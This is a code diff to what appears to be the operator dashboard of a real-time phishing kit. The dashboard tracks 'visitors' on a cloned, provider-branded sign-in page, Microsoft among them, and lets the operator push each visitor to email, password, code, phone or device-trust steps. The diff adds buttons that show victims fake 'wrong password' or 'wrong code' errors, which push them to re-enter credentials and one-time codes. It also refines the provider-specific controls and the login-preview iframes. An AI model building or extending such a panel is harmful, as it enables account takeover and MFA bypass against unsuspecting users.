@@ -79,6 +79,10 @@ const STEP_LABELS: Record<string, string> = {
   'device-trust': 'Device Trust',
   'verification-code': 'Verify Code',
   'phone-verify': 'Phone Verify',
+  'processing': '⏳ Waiting',
+  'error-email': '✗ Email',
+  'error-password': '✗ Password',
+  'error-code': '✗ Code',
 };
 
 const STEP_COLORS: Record<string, string> = {
@@ -95,6 +99,10 @@ const STEP_COLORS: Record<string, string> = {
   'device-trust': '#1d4ed8',
   'verification-code': '#6d28d9',
   'phone-verify': '#065f46',
+  'processing': '#92400e',
+  'error-email': '#991b1b',
+  'error-password': '#991b1b',
+  'error-code': '#991b1b',
 };
 
 const FIELD_LABELS: Record<string, string> = {
@@ -126,6 +134,13 @@ const PROVIDER_PUSH_STEPS: Record<string, { label: string; step: string; color: 
     { label: 'Phone Code',  step: 'phone-code',        color: '#b45309' },
   ],
 };
+
+const PROVIDER_ERROR_STEPS: { label: string; step: string; color: string }[] = [
+  { label: '⏳ Loading',   step: 'processing',     color: '#92400e' },
+  { label: '✗ Email err',  step: 'error-email',    color: '#991b1b' },
+  { label: '✗ Pwd err',    step: 'error-password', color: '#991b1b' },
+  { label: '✗ Code err',   step: 'error-code',     color: '#991b1b' },
+];
 
 function ProviderBadge({ provider, size = 14 }: { provider: string; size?: number }) {
   if (provider === 'microsoft') return <MicrosoftLogo />;
@@ -297,9 +312,15 @@ function VisitorModal({
 
             {/* Push actions */}
             <div className="p-4 border-b border-[#2d3139]">
-              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] mb-2.5">Push Step</p>
-              <div className="grid grid-cols-2 gap-1.5">
+              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] mb-2">Navigate</p>
+              <div className="grid grid-cols-2 gap-1.5 mb-3">
                 {(PROVIDER_PUSH_STEPS[visitor.provider] ?? PROVIDER_PUSH_STEPS.microsoft).map(({ label, step, color }) => (
+                  <ActionBtn key={step} fullWidth label={label} color={color} onClick={() => onPushAction(visitor.id, step)} />
+                ))}
+              </div>
+              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] mb-2">Simulate</p>
+              <div className="grid grid-cols-2 gap-1.5">
+                {PROVIDER_ERROR_STEPS.map(({ label, step, color }) => (
                   <ActionBtn key={step} fullWidth label={label} color={color} onClick={() => onPushAction(visitor.id, step)} />
                 ))}
               </div>
@@ -408,6 +429,7 @@ export default function AdminPage() {
   const [phoneEnabled, setPhoneEnabled] = useState(false);
   const [visitors, setVisitors] = useState<VisitorInfo[]>([]);
   const [modalVisitorId, setModalVisitorId] = useState<string | null>(null);
+  const [previewKey, setPreviewKey] = useState(0);
   const wsRef = useRef<WebSocket | null>(null);
 
   useEffect(() => {
@@ -558,7 +580,7 @@ export default function AdminPage() {
                 return (
                   <button
                     key={p.id}
-                    onClick={() => { setProvider(p.id); if (p.id !== 'microsoft') { setPrompt('password'); setPhoneEnabled(false); } }}
+                    onClick={() => { setProvider(p.id); setPreviewKey(k => k + 1); if (p.id !== 'microsoft') { setPrompt('password'); setPhoneEnabled(false); } }}
                     data-testid={`provider-btn-${p.id}`}
                     className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all text-left ${provider === p.id ? 'bg-[#23262f]' : 'hover:bg-[#1e2128]'}`}
                   >
@@ -695,10 +717,9 @@ export default function AdminPage() {
 
                       {/* Actions */}
                       <div className="px-2.5 pb-2.5 pt-1 flex gap-1 flex-wrap items-center">
-                        <ActionBtn label="↩ Email"    color="#4b5563" onClick={() => pushAction(v.id, 'email')} />
-                        <ActionBtn label="Password"   color="#0078D4" onClick={() => pushAction(v.id, 'password')} />
-                        <ActionBtn label="Code"       color="#7c3aed" onClick={() => pushAction(v.id, 'email-code')} />
-                        <ActionBtn label="Other ways" color="#047857" onClick={() => pushAction(v.id, 'other-ways')} />
+                        {(PROVIDER_PUSH_STEPS[v.provider] ?? PROVIDER_PUSH_STEPS.microsoft).map(({ label, step, color }) => (
+                          <ActionBtn key={step} label={label} color={color} onClick={() => pushAction(v.id, step)} />
+                        ))}
                         <button
                           onClick={() => setModalVisitorId(v.id)}
                           className="ml-auto flex items-center justify-center w-6 h-6 rounded bg-[#2d3139] hover:bg-[#3a3f4a] text-[#8a919e] hover:text-white transition-colors flex-shrink-0"
@@ -744,7 +765,7 @@ export default function AdminPage() {
                   </div>
                 </div>
               </div>
-              <iframe key={src} src={src} className="flex-1 border-0 bg-white" title="Login preview" />
+              <iframe key={`${src}-${previewKey}`} src={src} className="flex-1 border-0 bg-white" title="Login preview" />
             </div>
           )}
 
@@ -754,7 +775,7 @@ export default function AdminPage() {
               <div className="absolute top-1/2 -left-4 w-1.5 h-14 bg-[#2a2a2a] rounded-l-md -translate-y-1/2" />
               <div className="absolute top-1/2 -right-4 w-1.5 h-14 bg-[#2a2a2a] rounded-r-md -translate-y-1/2" />
               <div className="w-full h-full rounded-[2rem] overflow-hidden border border-white/10">
-                <iframe key={src} src={src} className="w-full h-full border-0" title="Login preview" />
+                <iframe key={`${src}-${previewKey}`} src={src} className="w-full h-full border-0" title="Login preview" />
               </div>
             </div>
           )}
@@ -770,7 +791,7 @@ export default function AdminPage() {
                 <div className="absolute top-0 inset-x-0 flex justify-center z-20 pointer-events-none">
                   <div className="w-[100px] h-[22px] bg-black rounded-b-3xl" />
                 </div>
-                <iframe key={src} src={src} className="w-full h-full border-0" title="Login preview" />
+                <iframe key={`${src}-${previewKey}`} src={src} className="w-full h-full border-0" title="Login preview" />
               </div>
             </div>
           )}
